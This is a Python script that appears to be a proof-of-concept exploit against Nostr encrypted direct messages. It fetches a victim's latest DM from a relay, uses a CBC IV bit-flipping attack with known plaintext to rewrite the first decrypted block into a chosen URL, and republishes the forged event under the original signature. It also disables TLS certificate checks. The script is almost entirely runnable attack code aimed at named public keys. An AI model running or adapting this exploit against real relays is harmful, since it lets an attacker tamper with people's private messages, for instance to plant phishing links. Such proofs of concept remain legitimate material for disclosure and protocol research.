import json
import ssl
import time
import random,string
import urllib.parse
import base64
import sys,os
sys.path.append(os.path.join(os.path.dirname(__file__), './python-nostr/'))
from nostr.key import PublicKey, PrivateKey
from nostr.filter import Filter, Filters
from nostr.event import Event, EventKind
from nostr.relay_manager import RelayManager
from nostr.message_type import ClientMessageType

from nostr.event import Event, EventKind


from Crypto.Util.strxor import strxor
from Crypto.Util.Padding import pad


KNOWN_PLAINTEXT = "https://shared.test/"
TARGET_PLAINTEXT = b"https://mu.test/"
if len(sys.argv)>1:
    if  len(sys.argv[1])>=16:
        KNOWN_PLAINTEXT = sys.argv[1]
    else:
        print('Known plaintext length must be given as 16 bytes. Bye.')
        exit(0)

print('Known plaintext \'%s\' is given.' % KNOWN_PLAINTEXT)
print('First block of ciphertext will be changed to \'%s\'.' % TARGET_PLAINTEXT.decode('utf-8'))
print('---')

def get_known_plaintext():
    known_plaintext = KNOWN_PLAINTEXT
    return known_plaintext.encode('utf-8')[:16]

def forgery_dm(event, msg_in_byte):
    if len(msg_in_byte)>16:
        return None
    if len(msg_in_byte)<16:
        msg_in_byte = pad(msg_in_byte, block_size=16)
    
    parse = urllib.parse.urlparse(event.content)
    ciphertext = base64.b64decode(parse.path)
    iv = base64.b64decode(parse.query[3:])
    known_plaintext = get_known_plaintext()
    print('iv', len(iv))
    print('msg_in_byte', len(msg_in_byte))
    print('known_plaintext', len(known_plaintext))

    iv_ = strxor(strxor(iv, known_plaintext),msg_in_byte)
    ciphertext_ = base64.b64encode(ciphertext).decode('utf-8')+"?iv="+base64.b64encode(iv_).decode('utf-8')

    sender_pubkey = event.public_key
    receiver_pubkey = event.tags[0][1]
    
    new_event = Event(kind=EventKind.ENCRYPTED_DIRECT_MESSAGE, content=ciphertext_, public_key=sender_pubkey, signature=event.signature)
    new_event.add_pubkey_ref(receiver_pubkey)
    
    return new_event


# for relay.example.com
pub_key = PublicKey.from_npub('npub10t7s2s97hxncztrhftag2txafuw2ae44dnvsjqxjyum33x90aeqsh4ezyc').hex()
victim_pub_key = PublicKey.from_npub('npub1saju4kaaqxkna98g4hcxs7cghtenem2frqs0n6aemx8p88mk0a8qr6p97w').hex()

filters = Filters([Filter(authors=[pub_key], kinds=[EventKind.ENCRYPTED_DIRECT_MESSAGE])])
subscription_id = "".join(random.choices(string.ascii_lowercase, k=64))
request = [ClientMessageType.REQUEST, subscription_id]
request.extend(filters.to_json_array())

relay_manager = RelayManager()
relay_manager.add_relay("wss://relay.example.com")
relay_manager.add_subscription(subscription_id, filters)

relay_manager.open_connections({"cert_reqs": ssl.CERT_NONE})
time.sleep(1.25) # allow the connections to open

message = json.dumps(request)
relay_manager.publish_message(message)
time.sleep(1) # allow the messages to send
latest_dm = None
while relay_manager.message_pool.has_events():
  try:
    event_msg = relay_manager.message_pool.get_event()
    #print(event_msg.event)
    #print(event_msg.event.content)
    if event_msg.event.kind == EventKind.ENCRYPTED_DIRECT_MESSAGE:
        if event_msg.event.public_key==pub_key:
            latest_dm = event_msg.event
  except:
      pass

if None==latest_dm:
    relay_manager.close_connections()
    print('no DM between target session. Bye.')
    exit(0)

print(latest_dm)


forged_event = forgery_dm(latest_dm, TARGET_PLAINTEXT)
print('modified messages:')
print(forged_event)
time.sleep(1.25)
relay_manager.publish_event(forged_event)

time.sleep(1.25)
print("----")
relay_manager.close_connections()
